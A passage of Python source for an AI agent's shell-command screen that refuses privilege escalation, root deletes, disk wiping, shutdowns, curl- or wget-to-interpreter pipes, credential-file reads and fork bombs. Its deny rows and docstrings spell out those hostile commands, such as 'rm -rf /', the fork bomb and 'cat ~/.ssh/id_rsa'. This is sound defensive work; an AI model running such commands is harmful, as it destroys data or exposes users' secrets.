        Runs on the full, untruncated command string, before the PEP is entered
        and before the capability is even described — a never-listed command
        must not be carded, and the 1024-character subject cap that blinds the
        floor (``PolicySubjects._MAX_CHARS``, ``rules.py:342``) does not apply
        here.
        """

        return self._screen(command, depth=0)

    def _screen(self, command: str, *, depth: int) -> ShellRefusal | None:
        """One pass of the screen, plus one recursion into a ``sh -c`` payload."""

        line = ParsedCommandLine.of(command)
        for detector in (
            self._privilege,
            self._destructive_delete,
            self._filesystem_destruction,
            self._machine_state,
            self._pipe_to_interpreter,
            self._credential_path,
            self._credential_file,
        ):
            note = detector(line)
            if note is not None:
                return self._refusal(note)
        if self._fork_bomb(command):
            return self._refusal(_Note.FORK_BOMB)
        if line.malformed:
            # Fail CLOSED, after the raw-string check that does not need tokens.
            # The old hand-rolled lexer was total by running an unterminated
            # quote to the end of the string and guessing; refusing is at least
            # as safe and is what upstream's `is_shell_command_allowed` does on
            # the same `ValueError`. Nothing is lost: the shell would reject the
            # same line as a syntax error.
            return self._refusal(_Note.UNPARSEABLE)
        if depth >= self._MAX_NESTED_DEPTH:
            return None
        for payload in self._command_strings(line):
            nested = self._screen(payload, depth=depth + 1)
            if nested is not None:
                return nested
        return None

    def floor(self) -> PermissionRuleset:
        """The coarse whole-command DENY rows for the PDP's ``_never`` ruleset.

        Compiled once and shared: the rows are constants and
        ``PermissionRuleset`` is frozen, so a per-call rebuild would only add
        allocation to the hottest path in the runtime.
        """

        cached = CommandNeverList._floor_rules
        if cached is None:
            cached = PermissionRuleset(
                rules=tuple(
                    PermissionRule(pattern=pattern, action=RuleAction.DENY)
                    for pattern in self.rows()
                )
            )
            CommandNeverList._floor_rules = cached
        return cached

    def always_grant_patterns(self, command: str) -> tuple[str, ...]:
        """``argv[0]``-keyed rule patterns for a run-scoped grant, or ``()``.

        ``()`` means this command may not earn a standing yes. Parsing never
        widens here — it only narrows what we offer — so every ambiguity
        returns ``()`` and costs a click rather than granting one.

        The pair is ``argv0`` and ``argv0 *``, never ``argv0*``: a rule matches
        by ``fullmatch`` over the whole command line, and the trailing space is
        the only word boundary the vocabulary has. Without it a ``pytest`` grant
        would also cover ``pytest-watch --exec "curl … | sh"`` (§8.3).

        ⚠️ **This is tier ASK, not tier AUTO** — the name is the trap. What it
        offers is written only after a human answers ``always`` on a card they
        read, and it expires with the run. Gating it on
        :meth:`auto_approvable`'s twenty-five-reader allow-list would mean a
        human could never say "always" to ``pytest``, which is §8.3's own worked
        example.

        The metacharacter guard IS upstream's, though, and that is a real
        improvement rather than a rename. ``contains_dangerous_patterns`` covers
        everything the hand-rolled operator scan covered, plus four shapes that
        were live holes — a bare ``$VAR``, ANSI-C ``$'…'``, a here-string, and a
        bare tab. ``pytest $EXTRA`` and ``pytest $IFS`` both used to earn a
        standing grant, because the old check only looked for the braced
        ``${``: the text the human approved and the text the shell runs were
        different strings.
        """

        if contains_dangerous_patterns(command):
            return ()
        line = ParsedCommandLine.of(command)
        if line.malformed or line.operators:
            return ()
        head = line.first_word
        if head is None:
            return ()
        name, verbatim = head
        # Quoting changed the head, so the literal text a glob will be matched
        # against is not the binary name. ``"sudo" rm`` and ``s'u'do rm`` both
        # dequote to ``sudo``; comparing the two spellings catches both, where a
        # prefix test on the raw string catches only the first.
        if not name or name != verbatim:
            return ()
        if CommandSegment.is_assignment(name):
            return ()
        if any(char in name for char in self._PATTERN_METACHARACTERS):
            return ()
        if name in self._WRAPPER_BINARIES or name in CommandSegment.INTRODUCERS:
            return ()
        if self.screen(command) is not None:
            return ()
        return (name, f"{name} *")

    # -- tier AUTO, which is not this module's gate -------------------------

    @classmethod
    def auto_approvable(cls, command: str) -> bool:
        """Upstream's **auto-approve** judgement — tier AUTO. ⚠️ **NOT the gate.**

        ``RECOMMENDED_SAFE_SHELL_COMMANDS`` holds twenty-five readers (``ls``,
        ``cat``, ``grep``, ``ps``, ``wc``) and **no** ``pytest``, ``npm``,
        ``git`` or ``make``. Two ways to misread it, both of which this
        docstring exists to stop:

        * **As tier NEVER's gate.** Swapping :meth:`screen`'s deny-list for this
          allow-list looks like a large, principled deletion and is a
          blocker-grade regression: the agent could no longer run your test
          suite at all, which is the entire product promise of Phase 1.
        * **As tier NEVER's whole answer.** It is a COMMAND allow-list, so
          ``is_shell_command_allowed("cat ~/.ssh/id_rsa", …)`` is ``True`` —
          ``cat`` is an allowed reader. Every path rule in
          :class:`SensitivePathPolicy` must survive independently of it, or
          approving a reader hands over ``id_rsa``.

        Nothing consults this yet, and that is honest rather than dead: Phase 1
        asks for a card on every command, so tier AUTO has no rung to sit on. It
        is here so the tier boundary is machine-checked
        (``test_never_list.py::TestTheThreeTiers``) rather than asserted in a
        comment, and so the vendored table has one named home.
        """

        return is_shell_command_allowed(command, cls._AUTO_SAFE)

    # -- the rows ----------------------------------------------------------

    @classmethod
    def rows(cls) -> tuple[str, ...]:
        """Every whole-command glob merged into ``_never``, in table order.

        Exposed so tests can assert on the literal rows: that none of them
        begins with ``~`` or ``$HOME`` (so ``Wildcard.expand`` leaves every one
        byte-identical), and that the deliberate misses stay misses.
        """

        rows: list[str] = []
        # Root/home recursive delete. Anchored at end of line on purpose, so
        # `rm -rf /Users/me/build` passes; `rm -rf / --no-preserve-root` is a
        # deliberate floor MISS that the screen catches.
        for flags in ("-rf", "-fr"):
            rows += [f"*rm {flags} {root}" for root in ("/", "~", "$HOME")]
        # Filesystem destruction.
        rows += [
            "mkfs*",
            "*mkfs *",
            "*dd *of=/dev/*",
            "* >/dev/disk*",
            "* > /dev/disk*",
        ]
        # Machine state. Two rows per binary: the bare invocation, and the
        # invocation with any argument.
        for binary in sorted(cls._MACHINE_STATE):
            rows += [binary, f"*{binary} *"]
        rows += ["*init 0", "*init 6", "*systemctl poweroff*", "*systemctl reboot*"]
        # Privilege. `su` is omitted on purpose: `*su *` fires on `echo su x`,
        # and a two-letter binary has no usable glob form. The screen has it.
        rows += ["sudo", "*sudo *", "doas", "*doas *", "*sudo -S*"]
        # Fork bomb. Every metacharacter in this row is escaped to a literal by
        # `_compile`, which is exactly why the one row works.
        rows += ["*:(){*};:*"]
        # Pipe-to-interpreter from the network. `|` compiles to a literal pipe.
        rows += [
            "*curl *|*sh*",
            "*curl *|*bash*",
            "*curl *|*python*",
            "*wget *|*sh*",
            "*wget *|*bash*",
            # ADDED (not in §9.2): the curl table has a python row and the wget
            # table did not, so `wget -qO- https://x | python3` was a floor
            # miss. Machine-checked: same shape, same false-positive class.
            "*wget *|*python*",
            "*iwr *|*iex*",
        ]
        rows += cls._segment_rows()
        rows += cls._filename_rows()
        return tuple(rows)

    @classmethod
    def _segment_rows(cls) -> tuple[str, ...]:
        """Three rows per credential directory — end, deeper, then an argument.

        A ``fullmatch`` needs one row for each way a segment can end the line,
        carry more path, or be followed by a space. **Never author these as
        ``~/.ssh/**``**: ``Wildcard.expand`` rewrites the leading ``~`` on the
        pattern side while the command text keeps its literal ``~``, so pattern
        and subject can never agree.

        The capitalised variant is emitted for any segment without a leading
        dot, which today means ``keychains`` only. It is not cosmetic: the
        TypeScript rule is case-INSENSITIVE and ``Wildcard.match`` is not, and
        the real macOS path is ``~/Library/Keychains`` — so without this row the
        entire ``keychains`` entry is inert on the one platform that has it.
        """

        rows: list[str] = []
        for segment in SensitivePathPolicy.ROOT_SEGMENTS:
            spellings = [segment]
            if not segment.startswith("."):
                spellings.append(segment.capitalize())
            for spelling in spellings:
                rows += [f"*/{spelling}", f"*/{spelling}/*", f"*/{spelling} *"]
        return tuple(rows)

    @classmethod
    def _filename_rows(cls) -> tuple[str, ...]:
        """Two rows per credential filename, and a third for prefixes only.

        ⚠️ The third form ``*<entry>.*`` is faithful to ``startsWith`` and to
        nothing else. ``suffixes`` is ``endsWith`` and ``exact`` is equality, so
        emitting it there converts an end-anchor into an infix and equality into
        a prefix — machine-checked, that over-generalisation refuses thirteen
        probe files ``isSensitiveFileName`` calls **not** sensitive
        (``cert.pem.bak``, ``tls.pem.example``, ``docs/credentials.md``,
        ``server.key.tpl``, ``.htpasswd.example``, ``.netrc.sample``,
        ``.pgpass.template``). A floor row is unappealable, so each of those
        would be a command nobody can run and nobody can approve.

        ``.env`` is the reason the third form exists at all: it is not a suffix,
        a prefix or an exact entry, so the first two forms emit nothing for it.
        Machine-checked — ``*.env`` matches ``cat .env`` but not
        ``cat .env.local``; ``*.env *`` matches neither; ``*.env.*`` matches
        ``cat .env.local`` but not ``cat .env``. **Do not collapse the triple to
        ``*.env*``**: that fires on ``echo x.envelope``.
        """

        rows: list[str] = []
        two_form = (
            *SensitivePathPolicy.FILE_SUFFIXES,
            *SensitivePathPolicy.FILE_EXACT,
        )
        for entry in two_form:
            rows += [f"*{entry}", f"*{entry} *"]
        for entry in SensitivePathPolicy.FILE_PREFIXES:
            rows += [f"*{entry}", f"*{entry} *", f"*{entry}.*"]
        dotenv = SensitivePathPolicy.DOTENV
        rows += [f"*{dotenv}", f"*{dotenv} *", f"*{dotenv}.*"]
        return tuple(rows)

    # -- detectors ---------------------------------------------------------

    def _privilege(self, line: ParsedCommandLine) -> str | None:
        """``sudo`` / ``doas`` / ``su`` in command position, or ``sudo -S``.

        Command position is the whole point: ``git commit -m "no sudo here"``
        lexes to four words, the last of which is the single token
        ``no sudo here``, so nothing here fires on it. (The ``*sudo *`` floor
        row does — that is the coarseness §9.2 accepts, and the corpus pins it.)
        """

        for segment in line.segments:
            candidates = segment.candidates
            if self._PRIVILEGE & set(candidates):
                return _Note.PRIVILEGE
            if self._PRIVILEGE & set(segment.argv) and (
                self._STDIN_PASSWORD_FLAG in segment.short_flags
            ):
                return _Note.PRIVILEGE
        return None

    def _destructive_delete(self, line: ParsedCommandLine) -> str | None:
        """A recursive ``rm`` whose operand resolves to ``/``, ``~`` or ``$HOME``.

        §9.2 specifies "a recursive+force flag set". This requires **recursive
        only**: the operand set is exactly three values for which no legitimate
        invocation exists, so ``rm -r /`` and ``rm -r ~`` cost nothing to refuse
        and are catastrophic to miss. The widening is deliberate and reported.
        """

        for segment in line.segments:
            if self._REMOVE not in segment.candidates:
                continue
            if not (self._RECURSIVE_FLAGS & segment.short_flags):
                continue
            for operand in segment.operands(self._REMOVE):
                if self._normalise_operand(operand) in self._CATASTROPHIC_ROOTS:
                    return _Note.DESTRUCTIVE_DELETE
        return None

    def _filesystem_destruction(self, line: ParsedCommandLine) -> str | None:
        """``mkfs*``, ``dd of=`` under ``/dev/``, or a redirect to a raw device."""

        for segment in line.segments:
            for candidate in segment.candidates:
                if candidate.startswith(self._MKFS):
                    return _Note.FILESYSTEM_DESTRUCTION
                if candidate != self._DD:
                    continue
                for word in segment.argv:
                    if word.startswith(self._DD_OUTPUT) and word[
                        len(self._DD_OUTPUT) :
                    ].startswith(self._DEVICE_ROOT):
                        return _Note.FILESYSTEM_DESTRUCTION
            for target in segment.redirect_targets:
                if self._is_raw_device(target):
                    return _Note.FILESYSTEM_DESTRUCTION
        return None

    def _machine_state(self, line: ParsedCommandLine) -> str | None:
        """``shutdown`` / ``reboot`` / ``halt`` / ``poweroff``, ``init 0|6``, ``systemctl``."""

        for segment in line.segments:
            candidates = set(segment.candidates)
            if self._MACHINE_STATE & candidates:
                return _Note.MACHINE_STATE
            if self._INIT in candidates and (
                self._INIT_RUNLEVELS & set(segment.operands(self._INIT))
            ):
                return _Note.MACHINE_STATE
            if self._SYSTEMCTL in candidates and (
                self._SYSTEMCTL_TARGETS & set(segment.operands(self._SYSTEMCTL))
            ):
                return _Note.MACHINE_STATE
        return None

    def _pipe_to_interpreter(self, line: ParsedCommandLine) -> str | None:
        """A pipeline whose source fetches from the network and whose sink runs code.

        Grouped by ``|`` specifically, not by every control operator:
        ``curl x && sh y`` is two commands and is a documented miss, while
        ``curl x | tee /tmp/a | sh`` is one pipeline and is a hit.
        """

        fetched = False
        for segment in line.segments:
            if segment.lead not in self._PIPE_OPERATORS:
                fetched = False
            candidates = segment.candidates
            if fetched and any(self._is_interpreter(name) for name in candidates):
                return _Note.PIPE_TO_INTERPRETER
            if self._FETCHERS & set(candidates):
                fetched = True
        return None

    def _credential_path(self, line: ParsedCommandLine) -> str | None:
        """Any word naming a path under a credential directory.

        Both spellings, because they lose different things: POSIX tokenising
        removes the ``\\`` from ``C:\\Users\\me\\.ssh\\id_rsa`` exactly as the
        shell does, and the verbatim spelling is what still reads as a path.
        """

        if any(map(SensitivePathPolicy.has_sensitive_segment, line.spellings)):
            return _Note.CREDENTIAL_PATH
        return None

    def _credential_file(self, line: ParsedCommandLine) -> str | None:
        """Any word whose leaf name satisfies ``isSensitiveFileName``."""

        if any(map(SensitivePathPolicy.leaf_is_sensitive, line.spellings)):
            return _Note.CREDENTIAL_FILE
        return None

    def _command_strings(self, line: ParsedCommandLine) -> tuple[str, ...]:
        """The ``-c`` payloads of any shell invoked in this line.

        Only a shell: ``python -c`` carries Python source, not a command line,
        and screening it as one would be a category error rather than extra
        coverage.
        """

        payloads: list[str] = []
        for segment in line.segments:
            if not (self._SHELL_BINARIES & set(segment.candidates)):
                continue
            argv = segment.argv
            for index, word in enumerate(argv):
                if not self._is_command_string_flag(word):
                    continue
                payload = next(
                    (
                        operand
                        for operand in argv[index + 1 :]
                        if not operand.startswith("-")
                    ),
                    None,
                )
                if payload:
                    payloads.append(payload)
                break
        return tuple(payloads)

    @classmethod
    def _is_command_string_flag(cls, word: str) -> bool:
        """True for ``-c`` or any short cluster containing it, never ``--c…``."""

        return (
            word.startswith("-")
            and not word.startswith("--")
            and cls._COMMAND_STRING_FLAG in word[1:]
        )

    @classmethod
    def _fork_bomb(cls, command: str) -> bool:
        """``:(){ :|:& };:`` and its spelling variants.

        Read off the raw text rather than the tokens because the shape *is*
        punctuation: a definition whose body pipes its own name into itself and
        backgrounds it. Whitespace is removed from the body before the check, so
        ``: () { : | : & }; :`` is the same hit.
        """

        for match in cls._FORK_BOMB.finditer(command):
            name = match.group(1)
            body = "".join(match.group(2).split())
            if f"{name}|{name}" in body and "&" in body:
                return True
        return False

    # -- helpers -----------------------------------------------------------

    @staticmethod
    def _refusal(note: str) -> ShellRefusal:
        """Every screen hit is the same closed reason; only the sentence differs."""

        return ShellRefusal.refused(ShellRefusalReason.COMMAND_NOT_PERMITTED, note)

    @staticmethod
    def _normalise_operand(operand: str) -> str:
        """Strip a trailing ``/`` or ``/*`` so ``/``, ``/*`` and ``~/`` compare equal."""

        stripped = operand.rstrip("*").rstrip("/")
        return stripped or "/"

    @classmethod
    def _is_raw_device(cls, target: str) -> bool:
        """True for ``/dev/disk2``, ``/dev/rdisk0``, ``/dev/sda`` and friends."""

        if not target.startswith(cls._DEVICE_ROOT):
            return False
        node = target[len(cls._DEVICE_ROOT) :]
        return node.startswith(cls._RAW_DEVICES)

    @classmethod
    def _is_interpreter(cls, name: str) -> bool:
        """True for a shell, ``python*``, or any other code-running binary."""

        leaf = name.rsplit("/", 1)[-1]
        return leaf in cls._INTERPRETERS or leaf.startswith(cls._INTERPRETER_PREFIX)


__all__ = [
    "CommandNeverList",
    "CommandSegment",
    "ParsedCommandLine",
    "SensitivePathPolicy",
]
